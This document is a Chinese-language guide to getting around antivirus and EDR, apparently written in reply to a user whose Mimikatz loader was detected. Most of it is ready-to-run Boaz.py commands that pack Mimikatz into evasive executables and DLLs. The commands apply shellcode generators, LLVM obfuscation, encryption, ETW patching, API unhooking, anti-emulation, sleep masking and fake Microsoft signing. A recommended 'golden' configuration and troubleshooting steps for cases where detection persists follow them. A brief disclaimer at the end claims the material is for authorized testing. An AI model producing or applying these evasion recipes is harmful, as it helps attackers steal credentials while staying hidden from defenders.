# AV/EDR 绕过指南

## 检测分析

根据你提供的检测结果：
```
类型: 木马
名称: MEM:Trojan.Win64.Shellcode.a
对象类型: 文件
对象路径: pmem:\C:\Users\Administrator\Desktop
原因: 专家分析
```

### 被检测的可能原因

1. **内存Shellcode特征检测**：
   - `MEM:Trojan.Win64.Shellcode.a` 表明杀毒软件检测到了内存中的shellcode特征
   - donut生成的shellcode可能包含已知的特征码
   - loader 1相对简单，容易被行为分析识别

2. **Mimikatz行为特征**：
   - Mimikatz的API调用序列（LSASS进程访问、内存读取等）被监控
   - 即使代码被混淆，行为模式仍然可被识别

3. **基础配置容易被绕过**：
   - 仅使用UUID编码不足以绕过现代EDR
   - loader 1缺乏高级的反分析技术

## 绕过策略建议

### 1. 使用更高级的Loader

推荐使用具有内存保护功能的loader：

```bash
# 使用内存保护loader 37 (高级隐秘加载器)
python3 Boaz.py -f /Virus/mimikatz_raw.exe -o /boaz/output/boaz_mi_advanced.exe -t donut -l 37 -e uuid -a -u -etw

# 使用线程执行loader 61 (页保护+VEH)
python3 Boaz.py -f /Virus/mimikatz_raw.exe -o /boaz/output/boaz_mi_threadless.exe -t donut -l 61 -e mac -a -sleep

# 使用断点处理loader 49
python3 Boaz.py -f /Virus/mimikatz_raw.exe -o /boaz/output/boaz_mi_breakpoint.exe -t donut -l 49 -e aes -a -u
```

### 2. 启用多层混淆技术

```bash
# 完整混淆配置
python3 Boaz.py -f /Virus/mimikatz_raw.exe -o /boaz/output/boaz_mi_full_obf.exe \
  -t donut -l 37 -c akira -e aes2 -obf -obf_api -a -u -g -etw -sleep -entropy 2
```

参数说明：
- `-c akira`: 使用Akira LLVM混淆器
- `-e aes2`: 分治AES加密，绕过逻辑路径劫持
- `-obf`: 启用源代码混淆
- `-obf_api`: API调用混淆
- `-a`: 反模拟检测
- `-u`: API解钩
- `-g`: Peruns Fart高级解钩
- `-etw`: ETW补丁
- `-sleep`: 睡眠混淆
- `-entropy 2`: 使用Pokémon名称降低熵值

### 3. 使用不同的Shellcode生成器

```bash
# 使用Amber加载器
python3 Boaz.py -f /Virus/mimikatz_raw.exe -o /boaz/output/boaz_mi_amber.exe -t amber -l 37 -c pluto -e chacha

# 使用Shoggoth
python3 Boaz.py -f /Virus/mimikatz_raw.exe -o /boaz/output/boaz_mi_shoggoth.exe -t shoggoth -l 51 -e rc4 -a

# 使用增强加载器
python3 Boaz.py -f /Virus/mimikatz_raw.exe -o /boaz/output/boaz_mi_augment.exe -t augment -l 65 -e des -obf
```

### 4. 内存加密和睡眠技术

```bash
# SweetDream堆栈加密
python3 Boaz.py -f /Virus/mimikatz_raw.exe -o /boaz/output/boaz_mi_dream.exe \
  -t donut -l 37 -e aes -dream 3000 -a -u

# 1500ms加密睡眠（默认值）
python3 Boaz.py -f /Virus/mimikatz_raw.exe -o /boaz/output/boaz_mi_sleep.exe \
  -t donut -l 37 -e uuid -dream -a -etw
```

### 5. 编译时混淆和签名

```bash
# 使用Pluto混淆器并签名
python3 Boaz.py -f /Virus/mimikatz_raw.exe -o /boaz/output/boaz_mi_pluto.exe \
  -t donut -l 37 -c pluto -mllvm "bcf,fla,mba,sub,idc,gle" -e aes2 \
  -obf -a -u -g -s www.microsoft.com

# DLL侧加载
python3 Boaz.py -f /Virus/mimikatz_raw.exe -o /boaz/output/boaz_mi_dll.dll \
  -t donut -l 37 -dll -c akira -e chacha -obf -a -u
```

## 高级绕过技术组合

### 推荐的黄金配置

```bash
# 最强绕过配置（基于测试效果）
python3 Boaz.py -f /Virus/mimikatz_raw.exe -o /boaz/output/boaz_mi_golden.exe \
  -t amber -l 57 -c akira -e aes2 \
  -obf -obf_api -a -u -g -etw -dream 2000 -entropy 2 -wm 0
```

### 分层执行策略

1. **第一阶段：基础测试**
   ```bash
   python3 Boaz.py -f /Virus/mimikatz_raw.exe -o test1.exe -t donut -l 16 -e base64
   ```

2. **第二阶段：添加混淆**
   ```bash
   python3 Boaz.py -f /Virus/mimikatz_raw.exe -o test2.exe -t donut -l 37 -c pluto -e aes -obf -a
   ```

3. **第三阶段：完整配置**
   ```bash
   python3 Boaz.py -f /Virus/mimikatz_raw.exe -o test3.exe -t amber -l 61 -c akira -e aes2 \
     -obf -obf_api -a -u -g -etw -dream -entropy 2
   ```

## 行为绕过建议

### 1. 时间延迟
在mimikatz执行前添加延迟，避免实时行为检测：
```bash
-dream 5000  # 5秒加密睡眠
-sleep       # 随机睡眠时间
```

### 2. 反模拟检测
确保启用反模拟功能：
```bash
-a  # 反模拟检测
```

### 3. API解钩
多层API解钩：
```bash
-u -g  # 基础解钩 + Peruns Fart
```

### 4. ETW绕过
阻止事件追踪：
```bash
-etw  # ETW补丁
```

## 测试验证流程

1. **静态测试**：
   - 先不运行程序，仅进行文件扫描
   - 检查静态检测结果

2. **动态测试**：
   - 在沙箱环境中运行
   - 观察行为检测结果

3. **内存扫描测试**：
   - 程序运行后手动触发内存扫描
   - 测试不同时间点的检测结果

## 故障排除

如果仍然被检测：

1. **更换loader**：尝试更高编号的loader
2. **增强编码**：使用aes2或chacha编码
3. **降低熵值**：使用`-entropy 2`参数
4. **添加签名**：使用`-s`参数添加合法签名
5. **更换shellcode生成器**：donut → amber/shoggoth

## 最佳实践

1. **组合使用**：不要依赖单一技术
2. **测试迭代**：逐步增加混淆级别
3. **环境模拟**：在接近目标的环境中测试
4. **保持更新**：关注AV/EDR的检测规则更新

记住：这些技术仅用于授权的安全测试和教育目的。